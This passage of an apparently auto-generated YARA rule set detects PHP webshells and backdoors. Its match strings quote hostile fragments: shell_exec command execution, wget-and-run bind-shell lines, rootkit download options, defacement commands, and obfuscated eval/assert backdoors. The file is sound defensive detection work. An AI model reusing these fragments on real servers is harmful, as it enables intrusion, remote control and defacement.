      $s17 = "zBxRgy0yXtKlLv+JX0BetwfdED6mokjKJ56rcMnUmS7p3krQmfmQGE5hhRf/Nt5Ja8Dq7r/A1RXO+fB8H9/32VkrT//fDMll1GsrWRmZK/g4i/8SG3rK4a8OU1N1U1/4" ascii
      $s18 = "mF0yOh/JtXX8KrQYGFYF2VTcswDQ2nWkxXL7qfUg7wwfq3pms3z0JWHNNnGicJWscf9S43hJRfRjBLCdR/T/MA8qFaSCE0wDbONHYAYXb37SKxub7yuNde2vDmYnAo/5" ascii
      $s19 = "8OgH2rbcHxTkEqdIuOhbKyjzc3I4c/Pxunuhksrh1cDnRqwDh+PGxfH+jUicZ62R5qUUT/+VrURWoyMxfm7YlIou1BkncxThEgsxMHdyOiyb+gAlAxWVdTk9odafl4ZH" ascii
      $s20 = "+0GyH8uHCekdL8wRQPfzBE4zR/v38KSw5LDmra6F/bNIlnPcKGUwxjmAYgH2kjQY3IZaElb/pVtd0bDRMn5/0zCxP0+I0RHvrNcL2IXjeHxrFe3pUItdWfNHi0JATdpW" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule Argon2iPasswordEncoder
{
   meta:
      description = "php17 - file Argon2iPasswordEncoder.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "28542968ae6de5d0dbf9ad75c0341fdb7850260f5a3d21cdd338ce998504270b"
   strings:
      $x1 = "* @author Zan Baldwin <hello@zanbaldwin.com>" fullword ascii
      $s2 = "$valid = !$this->isPasswordTooLong($raw) && \\sodium_crypto_pwhash_str_verify($encoded, $raw);" fullword ascii
      $s3 = "$valid = !$this->isPasswordTooLong($raw) && \\Sodium\\crypto_pwhash_str_verify($encoded, $raw);" fullword ascii
      $s4 = "* Argon2iPasswordEncoder uses the Argon2i hashing algorithm." fullword ascii
      $s5 = "throw new \\LogicException('Argon2i algorithm is not supported. Please install the libsodium extension or upgrade to PHP " fullword ascii
      $s6 = "return !$this->isPasswordTooLong($raw) && password_verify($raw, $encoded);" fullword ascii
      $s7 = "* Argon2iPasswordEncoder constructor." fullword ascii
      $s8 = "* @param int|null $memoryCost memory usage of the algorithm" fullword ascii
      $s9 = "public function isPasswordValid($encoded, $raw, $salt)" fullword ascii
      $s10 = "if (\\PHP_VERSION_ID >= 70200 && \\defined('PASSWORD_ARGON2I')) {" fullword ascii
      $s11 = "throw new BadCredentialsException('Invalid password.');" fullword ascii
      $s12 = "return password_hash($raw, \\PASSWORD_ARGON2I, $this->config);" fullword ascii
      $s13 = "'threads' => $threads ?? \\PASSWORD_ARGON2_DEFAULT_THREADS," fullword ascii
      $s14 = "if (\\class_exists('ParagonIE_Sodium_Compat') && \\method_exists('ParagonIE_Sodium_Compat', 'crypto_pwhash_is_available')) {" fullword ascii
      $s15 = "if (\\class_exists('ParagonIE_Sodium_Compat') && \\method_exists('ParagonIE_Sodium_Compat', 'crypto_pwhash_is_available'))" fullword ascii
      $s16 = "use Symfony\\Component\\Security\\Core\\Exception\\BadCredentialsException;" fullword ascii
      $s17 = "private function encodePasswordSodiumFunction($raw)" fullword ascii
      $s18 = "private function encodePasswordSodiumExtension($raw)" fullword ascii
      $s19 = "private function encodePasswordNative($raw)" fullword ascii
      $s20 = "'time_cost' => $timeCost ?? \\PASSWORD_ARGON2_DEFAULT_TIME_COST," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule sig_90c74648f3e196fda8c32e3a0cc846892ed759e1
{
   meta:
      description = "php17 - file 90c74648f3e196fda8c32e3a0cc846892ed759e1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "aacb1f283fd9383949e2ec4b6e3242660c813f0e65a02bed1874ff63bcf28dd6"
   strings:
      $s1 = "echo \"<br>Connect back Shell , bypass Firewalls<br>" fullword ascii
      $s2 = "echo \"<br><center><h3> CMD ExeCute </h3></center>\" ;" fullword ascii
      $s3 = "echo \"<br><center><h3> Fake Mail- DOS E-mail By Victim Server </h3></center>\" ;" fullword ascii
      $s4 = "//fake mail = Use victim server 4 DOS - fake mail " fullword ascii
      $s5 = "<title>SimAttacker - Version : 1.0.0 - Edited By KingDefacer</title>" fullword ascii
      $s6 = "echo \"<a href='?id=fm&fdownload=$dir$file'><span style='text-decoration: none'><font size='2' color='#008000'>download\";" fullword ascii
      $s7 = "CMD</font></span></a><font face=\"Tahoma\" size=\"2\"> Shell</font></b></p>" fullword ascii
      $s8 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword ascii
      $s9 = "//Connect Back -Firewall Bypass" fullword ascii
      $s10 = "header(\"Content-Disposition: attachment; filename=$entrypath\");" fullword ascii
      $s11 = "&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>" fullword ascii
      $s12 = "echo \"<script language='javascript'> alert('Sending Mail - please waite ...')</script>\";" fullword ascii
      $s13 = "$result=shell_exec(\"$cmd\");" fullword ascii
      $s14 = "if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {" fullword ascii
      $s15 = "//cmd-command line" fullword ascii
      $s16 = "&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>" fullword ascii
      $s17 = "header(\"Content-Length: \" . filesize($name));" fullword ascii
      $s18 = "echo \"<script language='javascript'> alert('\\:D Successfully uploaded.!')</script>\";" fullword ascii
      $s19 = "<span style=\"text-decoration: none\"><font color=\"#000000\">File Manager</font></span></a></font></span></font></b></p>" fullword ascii
      $s20 = "&nbsp;e-mail : kingdefacer@msn.com<br>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule php17_0xshell
{
   meta:
      description = "php17 - file 0xshell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2981cdb1472ebc7c212786b7e676751a28af8db15cdc4ba6f1df2f8d4fc0d2ec"
   strings:
      $x1 = "nk\" style=\"text-decoration:none;color:lime\" >Abk\\'s blog->http://blog.lolwaleet.com/</a></span></td>" fullword ascii
      $s2 = "<b><td><span style=\"color:white;\">Greets to </span>:</td><td><span><a href=\"https://twitter.com/Asystolik\" target=\"_blank\"" ascii
      $s3 = "=\"text-decoration:none;color:lightblue\">Abk Khan &hearts; (@Asystolik)</a></a> <a href=\"http://blog.lolwaleet.com/\" target=" ascii
      $s4 = "if(file_put_contents(getcwd().$slash.urldecode($deface).\".html\", 'Your site has been pwned')){" fullword ascii
      $s5 = "Execute command:<br>" fullword ascii
      $s6 = "<b><td><span style=\"color:white;\">Greets to </span>:</td><td><span><a href=\"https://twitter.com/Asystolik\" target=\"_blank\"" ascii
      $s7 = "<td style='border:none;'>:<?php echo @getmyuid();echo \" ( \".@get_current_user().\" )\"; ?> / <?php echo @getmygid() ?></td>" fullword ascii
      $s8 = "<td> <span style=\"color:white\">| </span><span style=\"color:lightgreen\"><a href=\"https://twitter.com/0xrony\" target=\"_blan" ascii
      $s9 = "<td> <span style=\"color:white\">|</span> <span style=\"color:silver\"><a href=\"https://twitter.com/iamnoooob\" target=\"_blank" ascii
      $s10 = "<td> <span style=\"color:white\">|</span> <span style=\"color:silver\"><a href=\"https://twitter.com/iamnoooob\" target=\"_blank" ascii
      $s11 = "<td> <span style=\"color:white\">| </span><span style=\"color:lightgreen\"><a href=\"https://twitter.com/0xrony\" target=\"_blan" ascii
      $s12 = "if(isset($_POST['password']) && $_POST['password'] == 'nub' ){" fullword ascii
      $s13 = "<p style='color:white;font-size:15px;text-shadow:2px 3px 3px black '>[+]Coded By Slayer <span style='font-size:25px'> &#x263B; <" ascii
      $s14 = "<td colspan=3><?php $dis = ini_get('disable_functions');echo ($dis?$dis:'All functions are enabled ;)') ?></td>" fullword ascii
      $s15 = "<input type=\"password\" name=\"password\" style=\"border:2px solid white;color:red;\">" fullword ascii
      $s16 = "#exec command" fullword ascii
      $s17 = "$result = shell_exec($exec);" fullword ascii
      $s18 = "<span style=\"font-size:35px;color:green;\">SIMPLE SHELL</span><br><br>" fullword ascii
      $s19 = "if(isset($_POST['exec'])){" fullword ascii
      $s20 = "if($_SERVER['HTTP_USER_AGENT'] != 'sly' ){" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      1 of ($x*) and 4 of them
}

rule _additionalFields
{
   meta:
      description = "php17 - file _additionalFields.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7b77ac6817148fc53d1ec02f69d997f04f1a0a13a628e0ed5692498fdf984057"
   strings:
      $s1 = "->dropDownList($options['processValueAs'])" fullword ascii
      $s2 = ")->checkbox(['label'=>Yii::t('app', 'Process')]);" fullword ascii
      $s3 = "if (isset($options['processValueAs'])) {" fullword ascii
      $s4 = "->label(Yii::t('app', 'Process values as:'));" fullword ascii
      $s5 = "$prefix . 'processValuesAs]'" fullword ascii
      $s6 = "/* @var $form \\kartik\\widgets\\ActiveForm */" fullword ascii
      $s7 = "/* @var \\app\\modules\\data\\models\\ImportModel $model */" fullword ascii
      $s8 = "echo Html::activeHiddenInput($model, $prefix. 'key]', ['value' => $field_key]);" fullword ascii
      $s9 = "foreach ($fields['additionalFields'] as $field_key => $options) {" fullword ascii
      $s10 = "$options['label']. ' (<small>'.$field_key.'</small>)'  ." fullword ascii
      $s11 = "<legend><?=Yii::t('app', 'Additional fields')?></legend>" fullword ascii
      $s12 = "/* @var $fields array */" fullword ascii
      $s13 = "$field_key ." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_982640be70ab4af89a9788084985ce16cbbfe075
{
   meta:
      description = "php17 - file 982640be70ab4af89a9788084985ce16cbbfe075.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3906d77740683afcd0a49d5ad9afb19c07ebd7c3d03f572c4bc7de2d6f372096"
   strings:
      $s1 = "eval(base64_decode('Ci8vU3RhcnRpbmcgY2FsbHMKaWYgKCFmdW5jdGlvbl9leGlzdHMoImdldG1pY3JvdGltZSIpKSB7ZnVuY3Rpb24gZ2V0bWljcm90aW1lKCkg" ascii
      $s2 = "UiIpLiI6Ii4kZGF0YXBpcGVbInBvcnQiXS4iLCBhbmQgeW91IHdpbGwgY29ubmVjdGVkIHRvICIuJGRhdGFwaXBlWyJyZW1vdGVhZGRyIl0uIjwvYj4hIFlvdSBzaG91" ascii
      $s3 = "Y2htb2Rfb1siciJdPzE6MCkuKCRjaG1vZF9vWyJ3Il0/MTowKS4oJGNobW9kX29bIngiXT8xOjApLigkY2htb2RfZ1siciJdPzE6MCkuKCRjaG1vZF9nWyJ3Il0/MTow" ascii
      $s4 = "aW5wdXQgdHlwZT1cImNoZWNrYm94XCIgbmFtZT1cImV2YWxfdHh0XCIgdmFsdWU9XCIxXCIiOyBpZiAoJGV2YWxfdHh0KSB7ZWNobyAiIGNoZWNrZWQiO30gZWNobyAi" ascii
      $s5 = "Y2hlY2tib3ggTkFNRT1jaG1vZF93W3JdIHZhbHVlPTEiLigkcGVybXNbInciXVsiciJdPyIgY2hlY2tlZCI6IiIpLiI+Jm5ic3A7UmVhZDxicj48aW5wdXQgdHlwZT1j" ascii
      $s6 = "aWxlWyJuYW1lIl0uIiAoY2FuJ3QgY29weSBcIiIuJHVwbG9hZGZpbGVbInRtcF9uYW1lIl0uIlwiIHRvIFwiIi4kdXBsb2FkcGF0aC4kZGVzdGluLiJcIiE8YnI+Ijt9" ascii
      $s7 = "aG8gIjxvcHRpb24gdmFsdWU9XCIiLiRrLiJcIiI7IGlmICgkayA9PSAkYmNbInNyYyJdKSB7ZWNobyAiIHNlbGVjdGVkIjt9IGVjaG8gIj4iLiR2WzBdLiI8L29wdGlv" ascii
      $s8 = "cDogMWVtOyBtYXJnaW4tYm90dG9tOiA1ZW07IG1hcmdpbi1yaWdodDogM2VtOyBtYXJnaW4tbGVmdDogNGVtOyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwO31ib2R5" ascii
      $s9 = "ZXRlbnYoIlNFUlZFUl9BRERSIiksJGJpbmRbInBvcnQiXSwkZXJybm8sJGVycnN0ciwwLjEpKSB7ZWNobyAiUG9ydCBhbHJlZHkgaW4gdXNlLCBzZWxlY3QgYW55IG90" ascii
      $s10 = "ICJmIjsgJGQgPSBkaXJuYW1lKCRta2ZpbGUpOyBpZiAoc3Vic3RyKCRkLC0xKSAhPSBESVJFQ1RPUllfU0VQQVJBVE9SKSB7JGQgLj0gRElSRUNUT1JZX1NFUEFSQVRP" ascii
      $s11 = "dCBuYW1lPSJkYXRhcGlwZVtyZW1vdGVhZGRyXSIgdmFsdWU9Ijw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkZGF0YXBpcGVbInJlbW90ZWFkZHIiXSk7ID8+Ij4m" ascii
      $s12 = "aWYgKCFpc19kaXIoJGQuRElSRUNUT1JZX1NFUEFSQVRPUi4kbykpIHskcmV0ID0gY29weSgkZC5ESVJFQ1RPUllfU0VQQVJBVE9SLiRvLCR0LkRJUkVDVE9SWV9TRVBB" ascii
      $s13 = "PiZuYnNwO1Bhc3N3b3JkOiA8aW5wdXQgdHlwZT10ZXh0IG5hbWU9ImJpbmRbcGFzc10iIHZhbHVlPSI8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJGJpbmRbInBh" ascii
      $s14 = "ZmZmOyBGT05ULUZBTUlMWTogdmVyZGFuYTsgVEVYVC1ERUNPUkFUSU9OOiBub25lO31BLkxpbmtzIHsgQ09MT1I6ICNmZmZmZmY7IFRFWFQtREVDT1JBVElPTjogbm9u" ascii
      $s15 = "dXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJzcWxfbG9naW4iIHZhbHVlPSI8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJHNxbF9sb2dpbik7ID8+Ij48aW5wdXQgdHlw" ascii
      $s16 = "OTAlIiBoZWlnaHQ9IjEiIHZhbGlnbj0idG9wIj48VEFCTEUgaGVpZ2h0PTEgY2VsbFNwYWNpbmc9MCBjZWxsUGFkZGluZz0wIHdpZHRoPSIxMDAlIiBib3JkZXI9MD48" ascii
      $s17 = "IGFjdGlvbj0iPD9waHAgZWNobyAkc3VybDsgPz4iPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWFjdCB2YWx1ZT0ibWtkaXIiPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1l" ascii
      $s18 = "IiIuJHN1cmwuImFjdD1pbWcmaW1nPXVwXCIgYWx0PVwiVVBESVJcIiBoZWlnaHQ9XCIyMFwiIHdpZHRoPVwiMjBcIiBib3JkZXI9XCIwXCI+Iiwkc3VybC4iYWN0PWxz" ascii
      $s19 = "PHRkPiAiLmRhdGUoImQvbS9ZIEg6aTpzIixmaWxlY3RpbWUoJGQuJGYpKS4iPC90ZD48L3RyPjx0cj48dGQ+PGI+QWNjZXNzIHRpbWU8L2I+PC90ZD48dGQ+ICIuZGF0" ascii
      $s20 = "PGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwic3FsX3NlcnZlclwiIHZhbHVlPVwiIi5odG1sc3BlY2lhbGNoYXJzKCRzcWxfc2VydmVyKS4iXCI+PGlucHV0IHR5" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      8 of them
}

rule php17_add
{
   meta:
      description = "php17 - file add.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "81131c87387a5161b45a81e5bc869da6e0a59e257aa1860efff4ae5312153550"
   strings:
      $s1 = "<form class=\"am-form am-form-horizontal\" action=\"index.php?action=add&stats=addyes\" method=\"POST\">" fullword ascii
      $s2 = "<!-- content start -->" fullword ascii
      $s3 = "<!-- content end -->" fullword ascii
      $s4 = "<input type=\"text\" name=\"add_password\" placeholder=\"" fullword ascii
      $s5 = "<div class=\"am-fl am-cf\"><strong class=\"am-text-primary am-text-lg\">webshell</strong> / <small>" fullword ascii
      $s6 = "/ PassWord</label>" fullword ascii
      $s7 = "<?php if($_GET[\"stats\"]==\"addyes\"):?>" fullword ascii
      $s8 = "/ PassWord\">" fullword ascii
      $s9 = "<input type=\"radio\" name=\"options\" id=\"option3\" value=\"ASPX\"> ASPX" fullword ascii
      $s10 = "<input type=\"radio\" name=\"options\" id=\"option1\" value=\"ASP\"> ASP" fullword ascii
      $s11 = "<input type=\"radio\" name=\"options\" id=\"option3\" value=\"JSP\"> JSP" fullword ascii
      $s12 = "<input type=\"radio\" name=\"options\" id=\"option2\" value=\"PHP\"> PHP" fullword ascii
      $s13 = "2014 AllMobilize, Inc. Licensed under MIT license.</p>" fullword ascii
      $s14 = "<input type=\"text\" name=\"add_url\" placeholder=\"" fullword ascii
      $s15 = "<label for=\"user-email\" class=\"am-u-sm-3 am-form-label\">" fullword ascii
      $s16 = "<label for=\"user-phone\" class=\"am-u-sm-3 am-form-label\">" fullword ascii
      $s17 = "<a href=\"#\" class=\"am-icon-btn am-icon-th-list am-show-sm-only admin-menu\" data-am-offcanvas=\"{target: '#admin-offcanvas'}" ascii
      $s18 = "<label for=\"user-name\" class=\"am-u-sm-3 am-form-label\">" fullword ascii
      $s19 = "<label for=\"user-intro\" class=\"am-u-sm-3 am-form-label\">" fullword ascii
      $s20 = "<footer class=\"admin-content-footer\">" fullword ascii
   condition:
      uint16(0) == 0x200a and filesize < 9KB and
      8 of them
}

rule admin_exception
{
   meta:
      description = "php17 - file admin_exception.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9dd8371806b61bea94b4550a84b7ad5d5914c7b2ef5d4ae0dd86f1f312038c2f"
   strings:
      $s1 = "* Elgg exception (failsafe mode)" fullword ascii
      $s2 = "* @tip Enable \"developers\" to give admins a stacktrace view." fullword ascii
      $s3 = "* @uses $vars['object'] An exception" fullword ascii
      $s4 = "* @subpackage Core" fullword ascii
      $s5 = "* Displays a single exception" fullword ascii
      $s6 = "* @package Elgg" fullword ascii
      $s7 = "<span title=\"Unrecoverable Error\">" fullword ascii
      $s8 = "Exception at time <?php echo elgg_extract('ts', $vars); ?>." fullword ascii
      $s9 = "<?php echo elgg_echo('exception:contact_admin'); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AppendWasAddedEvent
{
   meta:
      description = "php17 - file AppendWasAddedEvent.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "05fb2c92de6f92443541825651b232c2b75db34b555039280b124365d2a9c380"
   strings:
      $s1 = "* Create a new thread has reported event instance." fullword ascii
      $s2 = "* The thread that has been reported." fullword ascii
      $s3 = "* @var \\Hifone\\Models\\Append" fullword ascii
      $s4 = "public function __construct(Append $append)" fullword ascii
      $s5 = "namespace Hifone\\Events\\Append;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_1898eebe767f4dda4709621164eeef8377c43bb3
{
   meta:
      description = "php17 - file 1898eebe767f4dda4709621164eeef8377c43bb3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
   strings:
      $x1 = "s7s.com/\\\">x2300 Shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x2 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x3 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x4 = "myshellexec(\"lynx -dump $adires > sayko_bind;chmod 777 sayko_bind;./sayko_bind\");" fullword ascii
      $x5 = "-equiv=\\'refresh\\' content=\\'5\\\\;url=http\\:\\/\\/locus7s.com\\'>/g' index.*\">index.* Mass Defacement" fullword ascii
      $x6 = "myshellexec(\"wget $adires -O sayko_bind;chmod 777 sayko_bind;./sayko_bind\");" fullword ascii
      $x7 = "echo \"<b>Your ip: <a href=http://whois.domaintools.com/\".$_SERVER[\"REMOTE_ADDR\"].\">\".$_SERVER[\"REMOTE_ADDR\"].\"</a> - Se" ascii
      $x8 = "<OPTION VALUE=\"wget http://twofaced.org/linux2-6-all.c\">Linux Kernel 2.6.* rootkit.c" fullword ascii
      $x9 = "*  -Execute Mig-Log Logcleaner                           " fullword ascii
      $x10 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii
      $x11 = "$accessdeniedmess = \"<a href=\\\"http://locus7s.com\\\">x2300 Locus7Shell v.\".$shver.\"</a>: access denied\";" fullword ascii
      $x12 = "<OPTION VALUE=\"sed -i -e 's/<html>/<div style=\\'position\\:absolute\\;width\\:2000px\\;height\\:2000px\\;background-color\\:bl" ascii
      $x13 = "echo(\"<center><b>Bind Shell Backdoor:</b></br></br><form name=form method=POST>" fullword ascii
      $x14 = "$logfile = $tmpdir_logs.\"c99sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $x15 = "<OPTION VALUE=\"wget http://precision-gaming.com/sudo.c\">wget Linux sudo stack overflow" fullword ascii
      $x16 = "$fqb_log = \"FTP Quick Brute (called c99shell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s17 = "$out = \"# Dumped by Locous7Shell.SQL v. \".$shver.\"" fullword ascii
      $s18 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgcol" ascii
      $s19 = "*  -Execute Rootshell.c                                  " fullword ascii
      $s20 = "$c99sh_updateurl = \"http://locus7s.com/files/lshell_update/\"; //Update server" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*) and all of them
}

rule sig_596b5628f5ad7ab60664d57c42e8f4f1ad267552
{
   meta:
      description = "php17 - file 596b5628f5ad7ab60664d57c42e8f4f1ad267552.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5b6fa7bab8362a0482ca583a7dd0b1983e1fb9a86261da5bd6e4f2c8506c7b4a"
   strings:
      $s1 = "$mzlgyyyzfc = 6033; function fzlngft($sgzbxu, $lzdnfrxjgb){$or" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      all of them
}

rule sig_03255088ed63354a54e0e5ed957e9008
{
   meta:
      description = "php17 - file 03255088ed63354a54e0e5ed957e9008.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fa0532ca09d81d785896966d32c6c8b27ea72fad44b7cf851afd8c1540299e3b"
   strings:
      $s1 = "$aLllDqhF9Ji='Gf0g'.p1vyjb7q;$s5B=WWYoC.'~(_6??'&'S{r;'.MO7_w.'??';$zRV='4 $N/,H*SRQ'|'+6&L'." fullword ascii
      $s2 = "'+>(0nBA5>m*/y;$rXVM0eNfPQv='2'|'0';$P8mrlvoN='H  '|aD1;$dqj0='gw~uo~'&/*LZKSu'." fullword ascii
      $s3 = "'Hw';$vk51=XZJGI|H_LIB;$B4axu='H@^MP@S'|AAUDCIP;$iw2Ek=' '^d;$qiXb9kxQKZG=n&/*'." fullword ascii
      $s4 = "'&e1*/N;$o26_x=$s5B^$zRV;$vizM=$P8mrlvoN|$kvvWU;$Mrm61fy=$DOZFUJ&$dqj0;'bkTKZd'." fullword ascii
      $s5 = "'^[!'.zizTh.'^1Z.';$dFj7D0pGjw2=kqj_gP.'-k]'&w4G_3O.\">(T\";$zlv0ZC8qUEM='Z@EVK('." fullword ascii
      $s6 = "'%5H!CFA';$kvvWU='Q(o'^'tL[';$DOZFUJ='wg}wow'&'we}w~w';$Hd='?9C;P-d('.zDyO^#P1'." fullword ascii
      $s7 = "'nj{';$k9DzF8T6=$Hd|('w]C!z+'.F4BL.'{D'^'V/1A#q$Q&(9a');$eI=$mF|/*dFgu7sKlQI8C'." fullword ascii
      $s8 = "']cNraXtl%*/ouvmow;$mF='> [(S?)i^'^\"nDk} Om(n\";$zF=HDT|'HP@';$nkHBES=PS|PM;'eT'." fullword ascii
      $s9 = "'2_F-7#+Rt*/uw_owo.'{|}oo');if(!$o26_x($vizM($Mrm61fy($zF.$nkHBES./*hNYyhnTTeT'." fullword ascii
      $s10 = "'}5z}*/$dFj7D0pGjw2;$dcqR7XoQl=$zlv0ZC8qUEM&('ww}'.qww_n.'}ost}oo'&'kvg{'./*rL'." fullword ascii
      $s11 = "'Qky';$FGoKjPiloK=A|A;$Vfe_NmA=L^':';$QNSzplc=' '|l;$koj='@T@PK'|HDTPV;'z_6i1Q'." fullword ascii
      $s12 = "'2UVig?f{Q#*/$k9DzF8T6($eI($Vfe_NmA.$QNSzplc.('1'|'\"'),3),$dcqR7XoQl(false,/*a'." fullword ascii
      $s13 = "'e*/XtGb.'}'^'aD\"[L';$DbV='3wc4}'.t7gs.';q{{'&'wlo~e:5i=w;=c';$MH0NJ3amy=M^/*w'." fullword ascii
      $s14 = "'f^(-^K>G='^'9301=E9(US9>U(C';$hUeqy='5d!5`@ 3a!1!'|'!@00D\"5#a9 6';$rIP=/*z8Rn'." fullword ascii
      $s15 = "':Ld.Hp~mr*/$FGoKjPiloK)),$hUeqy.$rIP.$DbV.$MH0NJ3amy.$rXVM0eNfPQv))/*PyiHVwAc'." fullword ascii
      $s16 = "'Zve_e<&*/$Mrm61fy($koj.$vk51.$B4axu.$iw2Ek.$qiXb9kxQKZG)));#SR)tRF}$(_usxjI$'." fullword ascii
      $s17 = "'=c!-5Dk2I9&P__vcGvVq2.q!9CFQ>Kv2h+]jnD<$upXvxnga$o_k#jdyx!4{N[2{CuwR';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule ArrayContainMatcherSpec
{
   meta:
      description = "php17 - file ArrayContainMatcherSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f5bd6425746afafbe9d437b3d2a4787a2e5d21627d8a67ed621d7688a52475aa"
   strings:
      $s1 = "$this->supports('contain', array(), array(''))->shouldReturn(true);" fullword ascii
      $s2 = "$this->shouldThrow('PhpSpec\\Exception\\Example\\FailureException')" fullword ascii
      $s3 = "$this->shouldNotThrow()->duringPositiveMatch('contain', array('abc'), array('abc'));" fullword ascii
      $s4 = "$this->shouldThrow()->duringPositiveMatch('contain', array(1,2,3), array('abc'));" fullword ascii
      $s5 = "$this->shouldNotThrow()->duringNegativeMatch('contain', array(1,2,3), array('abc'));" fullword ascii
      $s6 = "$presenter->presentString(Argument::any())->willReturnArgument();" fullword ascii
      $s7 = "$presenter->presentValue(Argument::any())->willReturn('countable');" fullword ascii
      $s8 = "$this->shouldBeAnInstanceOf('PhpSpec\\Matcher\\Matcher');" fullword ascii
      $s9 = "function it_does_not_match_array_without_specified_value()" fullword ascii
      $s10 = "function it_matches_array_with_specified_value()" fullword ascii
      $s11 = "function it_matches_array_without_specified_value()" fullword ascii
      $s12 = "->duringPositiveMatch('contain', array(1,2,3), array(new \\stdClass()));" fullword ascii
      $s13 = "use PhpSpec\\Formatter\\Presenter\\Presenter;" fullword ascii
      $s14 = "$this->beConstructedWith($presenter);" fullword ascii
      $s15 = "namespace spec\\PhpSpec\\Matcher;" fullword ascii
      $s16 = "function it_responds_to_contain()" fullword ascii
      $s17 = "function let(Presenter $presenter)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_09b20f171c0404671c05fc97d96d478582a7a448
{
   meta:
      description = "php17 - file 09b20f171c0404671c05fc97d96d478582a7a448.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5c20af433aa66e8e5b95174ec7c7eab3555523279cfd9c0d72850ac69a2dc7aa"
   strings:
      $s1 = "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:zcg=\"http://php.net/xsl\">" fullword ascii
      $s2 = "<xsl:template match=\"/root\">" fullword ascii
      $s3 = "$xml='<root>assert($_POST[a]);</root>';" fullword ascii
      $s4 = "$xsl='<?php xml version=\"1.0\" encoding=\"UTF-8\"?>" fullword ascii
      $s5 = "$proc->importStyleSheet($xsldoc);" fullword ascii
      $s6 = "<xsl:value-of select=\"zcg:function(\\'assert\\',string(.))\"/>" fullword ascii
      $s7 = "$xmldoc = DOMDocument::loadXML($xml);" fullword ascii
      $s8 = "$xsldoc = DOMDocument::loadXML($xsl);" fullword ascii
   condition:
      uint16(0) == 0x3c20 and filesize < 1KB and
      all of them
}

rule sig_453e73c9fe285478ec5f872c48103caa9373eab8
{
   meta:
      description = "php17 - file 453e73c9fe285478ec5f872c48103caa9373eab8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5c871183444dbb5c8766df6b126bd80c624a63a16cc39e20a0f7b002216b2ba5"
   strings:
      $s1 = "]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n985de9'];if(isset($s22)){eval($s21($s22));}" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php17_2016
{
   meta:
      description = "php17 - file 2016.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8870a8c6bd83a85031cde0709193ae6d6ad6e413167d6462116a13b4b07b55a4"
   strings:
      $s1 = "@fputs(fopen(base64_decode('cGx1Z2luX20ucGhw'),w),base64_decode('PD9waHAgQGFzc2VydCgkX1BPU1RbJ2xvb2ttZSddKTs/Pg=='));" fullword ascii
      $s2 = "header('HTTP/1.1 404');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _time_picker_blade
{
   meta:
      description = "php17 - file _time-picker.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
